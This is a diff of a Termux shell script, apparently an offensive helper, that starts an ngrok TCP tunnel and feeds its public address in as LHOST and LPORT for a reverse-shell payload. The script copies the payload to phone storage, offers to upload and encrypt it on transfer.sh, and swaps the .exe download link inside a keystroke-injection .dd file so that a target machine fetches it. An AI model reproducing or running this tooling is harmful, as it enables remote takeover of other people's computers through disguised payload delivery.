@@ -1,16 +1,48 @@
 #!/bin/sh
-echo "Checking if any ngrok server is already running and killing it..."
-~/msf/script/check_ngrok.sh
-pkill ngrok
-ngrok tcp 5656 > /dev/null &
-echo "NGROK RANDOM SERVER TCP IS STARTING..."
-sleep 4.5
 TEMPFILE=/data/data/com.termux/files/home/msf/temp/.temp_ip_ngrok-tcp.txt
+FILE=reverse$RANDOM-$(cat $TEMPFILE |sed "s#:#-port#g")
+PORT=$(cat $TEMPFILE |  cut -d ':' -f2)
+IP=$(cat $TEMPFILE | sed 's/\:.*//')
+RANDOMLETTER=$(cat /dev/urandom | tr -cd 'a-f0-9' | head -c 5)                          LINKFILE=/data/data/com.termux/files/home/msf/temp/link-$FILE.txt                       ARCHIVE="/data/data/com.termux/files/home/msf/temp/reverse-$RANDOMLETTER.zip"           TEMP="/data/data/com.termux/files/home/msf/temp"                                        ENCRYPTEDFILE="/data/data/com.termux/files/home/msf/temp/$FILE-encrypted.zip"           DDFILE="/data/data/com.termux/files/home/msf/dd/payload_sample.dd"                      DDFILEENCRYPTED="/data/data/com.termux/files/home/msf/dd/payload_sample_encrypted.dd"
+OLDLINK=$(cat ~/msf/temp/old_link.txt)                                                  NEWLINK=$(cat ~/msf/temp/new_link.txt)
+
+echo "\033[1;32m____    ____  ___       __  ___      ___      .__   __.  _______   __  
+\   \  /   / /   \     |  |/  /     /   \     |  \ |  | |       \ |  | 
+ \   \/   / /  ^  \    |  '  /     /  ^  \    |   \|  | |  .--.  ||  | 
+  \      / /  /_\  \   |    <     /  /_\  \   |  . \`  | |  |  |  ||  | 
+   \    / /  _____  \  |  .  \   /  _____  \  |  |\   | |  '--'  ||  | 
+    \__/ /__/     \__\ |__|\__\ /__/     \__\ |__| \__| |_______/ |__| 
+                                                                       
+ __    __       _______. _______  _______  __    __   __               
+|  |  |  |     /       ||   ____||   ____||  |  |  | |  |              
+|  |  |  |    |   (----\`|  |__   |  |__   |  |  |  | |  |              
+|  |  |  |     \   \    |   __|  |   __|  |  |  |  | |  |              
+|  \`--'  | .----)   |   |  |____ |  |     |  \`--'  | |  \`----.         
+ \______/  |_______/    |_______||__|      \______/  |_______|         
+                                                                       
+.___________.  ______     ______    __          _______.               
+|           | /  __  \   /  __  \  |  |        /       |               
+\`---|  |----\`|  |  |  | |  |  |  | |  |       |   (----\`               
+    |  |     |  |  |  | |  |  |  | |  |        \   \                   
+    |  |     |  \`--'  | |  \`--'  | |  \`----.----)   |                  
+    |__|      \______/   \______/  |_______|_______/                   
+                                                                       
+\033[0m"
+echo "\033[1;34m \nIf have already have a ngrok server running to you want to kill it or not?\033[0m"
+echo "\033[1;34m \nType "y" for yes, "n" for no, then press ENTER\033[0m"
+read ngrok_choice
+if [ $ngrok_choice = "y" ]; then
+	~/msf/script/check_ngrok.sh
+	pkill ngrok
+	echo "NGROK RANDOM SERVER TCP IS STARTING..."
+	ngrok tcp 5656 > /dev/null &
+fi
+if [ $ngrok_choice = "n" ]; then
+	~/msf/script/check_ngrok.sh
+fi
+sleep 4.5
 echo "$(curl -s localhost:4040/api/tunnels | grep -Eo "(tcp)://[a-zA-Z0-9./?=_%:-]*" | sed "s#tcp://##g")" > $TEMPFILE
 echo "The file\033[1;32m .temp_ip_ngrok-tcp.txt \033[0m has been created to store the IP & PORT address of your ngrok server"
-FILE=reverse$RANDOM-$(cat $TEMPFILE |sed "s#:#-port#g")
-IP=$(cat $TEMPFILE | sed 's/\:.*//')
-PORT=$(cat $TEMPFILE |  cut -d ':' -f2)
 echo "\033[1;32m \nCreating the payload...\033[0m"
 echo "LHOST PAYLOAD: \033[1;34m$IP\033[0m \nLPORT PAYLOAD: \033[1;34m$PORT\033[0m"
 
@@ -43,15 +75,6 @@ echo "\033[1;32m $FILE  \033[0m"
 echo "::::Copying the payload in utiles/msf folder... :\n"
 cp ~/msf/temp/$FILE* /storage/emulated/0/utiles/msf/
 echo "\033[1;32m$(ls /storage/emulated/0/utiles/msf/$FILE*)\033[0m"
-
-RANDOMLETTER=$(cat /dev/urandom | tr -cd 'a-f0-9' | head -c 5)
-LINKFILE=/data/data/com.termux/files/home/msf/temp/link-$FILE.txt
-ARCHIVE="/data/data/com.termux/files/home/msf/temp/reverse-$RANDOMLETTER.zip"
-TEMP="/data/data/com.termux/files/home/msf/temp"
-ENCRYPTEDFILE="/data/data/com.termux/files/home/msf/temp/$FILE-encrypted.zip"
-DDFILE="/data/data/com.termux/files/home/msf/dd/payload_sample.dd"
-DDFILEENCRYPTED="/data/data/com.termux/files/home/msf/dd/payload_sample_encrypted.dd"
-
 
 echo "\033[1;33m\n:::: DO YOU WANT TO UPLOAD AND ENCRYPT YOUR PAYLOAD ON TRANSFER.SH? \n:::: Type "y" for UPLOAD\n:::: Type "yy" for UPLOAD & ENCRYPT\033[0m\033[1;32m(Alpha version soon)\033[0m\033[1;33m\n:::: or press ENTER for none of that\n\033[0m"
 read UPLOAD_choice
@@ -90,8 +113,6 @@ echo "\nold link: \033[1;32m $(cat /data/data/com.termux/files/home/msf/dd/paylo
 echo "new link:\033[1;32m $(cat /storage/emulated/0/utiles/payload.dd | grep -Eo 'http.*.exe' | cut -d' ' -f1)\033[0m"
 echo "$(cat $DDFILE | grep -Eo 'http.*.exe' | cut -d' ' -f1)" > $TEMP/old_link.txt
 echo "$(cat $LINKFILE)" > $TEMP/new_link.txt
-OLDLINK=$(cat ~/msf/temp/old_link.txt)
-NEWLINK=$(cat ~/msf/temp/new_link.txt)
 if [ $OLDLINK = $NEWLINK ]; then
 	echo "\033[1;31m Failed to change the link in the .dd file \033[0m"
 else
